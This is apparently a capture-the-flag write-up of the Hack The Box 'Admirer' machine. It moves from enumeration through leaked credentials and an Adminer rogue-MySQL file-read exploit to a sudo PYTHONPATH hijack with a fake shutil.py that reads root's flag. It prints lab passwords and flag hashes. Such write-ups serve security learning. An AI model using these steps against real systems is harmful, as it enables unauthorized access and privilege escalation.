# ADMIRER

## NMAP

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/admirer]
└─$ nmap 10.10.10.187
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-16 06:28 EDT
Nmap scan report for 10.10.10.187
Host is up (0.21s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 40.62 seconds
                                                                     
┌──(kali㉿kali)-[~/Downloads/hackthebox/admirer]
└─$ nmap 10.10.10.187 -p 21,22,80 -A
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-16 06:29 EDT
Nmap scan report for 10.10.10.187
Host is up (0.21s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/admin-dir
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Admirer
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.01 seconds
```

## PORT 80

### WEBSITE

![](https://github.com/Leo-2807/Writeups/blob/main/images/admirer1.png)

### ROBOTS.TXT

![](https://github.com/Leo-2807/Writeups/blob/main/images/admirer2.png)

### /ADMIN-DIR

![](https://github.com/Leo-2807/Writeups/blob/main/images/admirer2.0.png)

#### GOBUSTER

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/admirer]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.187/admin-dir/ -x .txt                    
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.187/admin-dir/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt
[+] Timeout:                 10s
===============================================================
2021/08/16 06:52:16 Starting gobuster in directory enumeration mode
===============================================================
/contacts.txt         (Status: 200) [Size: 350]
/credentials.txt      (Status: 200) [Size: 136]
```
#### CONTACT.TXT

![](https://github.com/Leo-2807/Writeups/blob/main/images/admirer3.png)

#### CREDENTIALS.TXT

![](https://github.com/Leo-2807/Writeups/blob/main/images/admirer4.png)

## PORT 21

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/admirer]
└─$ ftp 10.10.10.187
Connected to 10.10.10.187.
220 (vsFTPd 3.0.3)
Name (10.10.10.187:kali): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            3405 Dec 02  2019 dump.sql
-rw-r--r--    1 0        0         5270987 Dec 03  2019 html.tar.gz
226 Directory send OK.
ftp> get dump.sql
local: dump.sql remote: dump.sql
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for dump.sql (3405 bytes).
226 Transfer complete.
3405 bytes received in 0.00 secs (3.8658 MB/s)
ftp> get html.tar.gz
local: html.tar.gz remote: html.tar.gz
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for html.tar.gz (5270987 bytes).
226 Transfer complete.
5270987 bytes received in 15.29 secs (336.6955 kB/s)
ftp> exit
221 Goodbye.
```                                                                             
### HTML.TAR.GZ

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/admirer]
└─$ la
dump.sql  html.tar.gz  
```

I did not find anything useful in ```dump.sql```

So I extracted ```html.tar.gz```

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/admirer]
└─$ tar xvf html.tar.gz
```

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/admirer]
└─$ la
dump.sql   index.php   utility-scripts
assets    html.tar.gz  images         robots.txt  w4ld0s_s3cr3t_d1r
                                                                                            
┌──(kali㉿kali)-[~/Downloads/hackthebox/admirer]
└─$ cd utility-scripts 
                                                                                            
┌──(kali㉿kali)-[~/Downloads/hackthebox/admirer/utility-scripts]
└─$ la
admin_tasks.php  db_admin.php  info.php  phptest.php
                                                                                                                                                                                       
┌──(kali㉿kali)-[~/Downloads/hackthebox/admirer/utility-scripts]
└─$ cat db_admin.php 
<?php
  $servername = "localhost";
  $username = "waldo";
  $password = "Wh3r3_1s_w4ld0?";

  // Create connection
  $conn = new mysqli($servername, $username, $password);

  // Check connection
  if ($conn->connect_error) {
      die("Connection failed: " . $conn->connect_error);
  }
  echo "Connected successfully";


  // TODO: Finish implementing this or find a better open source alternative
?>
```

### INDEX.PHP

```
$servername = "localhost";
$username = "waldo";
$password = "]F7jLHw:*G>UPrTo}~A"d6b";
$dbname = "admirerdb"
```

I tried both these creds to get into ssh or ftp but they did not work

After some more failed attempts I thought maybe these php files are pages on the website

## LOGIN

So admin_tasks.php , info.php and phptest.php are pages but db_admin.php is not

I tried to some things with the admin_tasks.php but nothing worked

Going back to the db_admin.php I notice ```better open source alternative``` 

On searching google for ```open souce alternative to db_admin``` I found this
```Adminer. Adminer is a single 186kB file (or 281kB if you want the multi-lingual version)```

Since the name of our machine is admirer I thought maybe this could be a hint

So I tried opening the page ```/utility-scripts/adminer.php``` and it worked

![](https://github.com/Leo-2807/Writeups/blob/main/images/admirer6.png)

Trying to login using the creds that we have does not work

## EXPLOIT

Searching for ```adminer 4.6.2 vulnerbilities``` I come across this [article](https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool)

First we need to make a mysql data base on our server 

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/admirer]
└─$ sudo mysql -u root -p                    
[sudo] password for kali: 
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 38
Server version: 10.5.10-MariaDB-2 Debian 11

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> CREATE USER 'test'@'%' IDENTIFIED BY 'test';
Query OK, 0 rows affected (0.010 sec)

MariaDB [(none)]> GRANT ALL PRIVILEGES ON *.* TO 'test'@'%';
Query OK, 0 rows affected (0.005 sec)

MariaDB [(none)]> FLUSH PRIVILEGES;
Query OK, 0 rows affected (0.000 sec)

MariaDB [(none)]> create database admirer;
Query OK, 1 row affected (0.000 sec)

MariaDB [(none)]> use admirer;
Database changed
MariaDB [admirer]> create table demo(name varchar(255));
Query OK, 0 rows affected (0.026 sec)

MariaDB [admirer]> exit
Bye
```

Now we need to configure MYSQL to bind with the local address. we will do this by editing the conf file in ```/etc/mysql```

```
nano /etc/mysql/mariadb.conf.d/50-server.cnf
```
Now change the bind-address from 127.0.0.1 to 0.0.0.0

Now just restart the mysql service and login into adminer.php

![](https://github.com/Leo-2807/Writeups/blob/main/images/admirer7.png)

Now we need to get data from the target machine's database 
This is the [souce](https://dev.mysql.com/doc/refman/5.7/en/loading-tables.html) that I used 

![](https://github.com/Leo-2807/Writeups/blob/main/images/admirer8.png)

Now viewing the demo table we get the credentials for ```waldo```

```
 $username = "waldo";
 $password = "&<h5b~yK3F#{PaPB&dA}{H>";
```

## USER.TXT

We can use these creds to ssh into the machine and get user text

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/admirer]
└─$ ssh waldo@10.10.10.187          
waldo@10.10.10.187's password: 
Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
Last login: Wed Apr 29 10:56:59 2020 from 10.10.14.3
waldo@admirer:~$ whoami
waldo
waldo@admirer:~$ ls
user.txt
waldo@admirer:~$ cat user.txt
312eb9a4f210b71a63c80b0dfd25d2e7
```

## ROOT.TXT

### SUDO -L

```
waldo@admirer:~$ sudo -l
[sudo] password for waldo: 
Matching Defaults entries for waldo on admirer:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    listpw=always

User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

### ADMIN_TASKS.SH

```
waldo@admirer:/opt/scripts$ cat admin_tasks.sh
#!/bin/bash

view_uptime()
{
    /usr/bin/uptime -p
}

view_users()
{
    /usr/bin/w
}

view_crontab()
{
    /usr/bin/crontab -l
}

backup_passwd()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/passwd to /var/backups/passwd.bak..."
        /bin/cp /etc/passwd /var/backups/passwd.bak
        /bin/chown root:root /var/backups/passwd.bak
        /bin/chmod 600 /var/backups/passwd.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_shadow()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/shadow to /var/backups/shadow.bak..."
        /bin/cp /etc/shadow /var/backups/shadow.bak
        /bin/chown root:shadow /var/backups/shadow.bak
        /bin/chmod 600 /var/backups/shadow.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_web()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_db()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running mysqldump in the background, it may take a while..."
        #/usr/bin/mysqldump -u root admirerdb > /srv/ftp/dump.sql &
        /usr/bin/mysqldump -u root admirerdb > /var/backups/dump.sql &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}



# Non-interactive way, to be used by the web interface
if [ $# -eq 1 ]
then
    option=$1
    case $option in
        1) view_uptime ;;
        2) view_users ;;
        3) view_crontab ;;
        4) backup_passwd ;;
        5) backup_shadow ;;
        6) backup_web ;;
        7) backup_db ;;

        *) echo "Unknown option." >&2
    esac

    exit 0
fi


# Interactive way, to be called from the command line
options=("View system uptime"
         "View logged in users"
         "View crontab"
         "Backup passwd file"
         "Backup shadow file"
         "Backup web data"
         "Backup DB"
         "Quit")

echo
echo "[[[ System Administration Menu ]]]"
PS3="Choose an option: "
COLUMNS=11
select opt in "${options[@]}"; do
    case $REPLY in
        1) view_uptime ; break ;;
        2) view_users ; break ;;
        3) view_crontab ; break ;;
        4) backup_passwd ; break ;;
        5) backup_shadow ; break ;;
        6) backup_web ; break ;;
        7) backup_db ; break ;;
        8) echo "Bye!" ; break ;;

        *) echo "Unknown option." >&2
    esac
done

exit 0
```

So this script is doing some stuff and making backup files
But what is interesting is that it is calling a python script to do web data backup

```
backup_web()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}
```

### BACKUP.PY

```python
waldo@admirer:/opt/scripts$ cat  backup.py
#!/usr/bin/python3

from shutil import make_archive

src = '/var/www/html/'

# old ftp directory, not used anymore
#dst = '/srv/ftp/html'

dst = '/var/backups/html'

make_archive(dst, 'gztar', src)
```

The python script is using the shutil library which we can exploit

We make a shutil.py file with a make_archive method in which we can add our code to read the root.txt

>We need to have three parameters in the make_archive method that we make 

```python
import os

def make_archive(a , b, c):
        os.system("cat /root/root.txt")
```

Also to add the path of our file we need to use PYTHONPATH

```
waldo@admirer:/opt/scripts$ nano /tmp/test/shutil.py
waldo@admirer:/opt/scripts$ sudo PYTHONPATH=/tmp/test /opt/scripts/admin_tasks.sh

[[[ System Administration Menu ]]]
1) View system uptime
2) View logged in users
3) View crontab
4) Backup passwd file
5) Backup shadow file
6) Backup web data
7) Backup DB
8) Quit
Choose an option: 6
Running backup script in the background, it might take a while...
waldo@admirer:/opt/scripts$ bf936bbe3e1b48178a74ce8db411c237
```











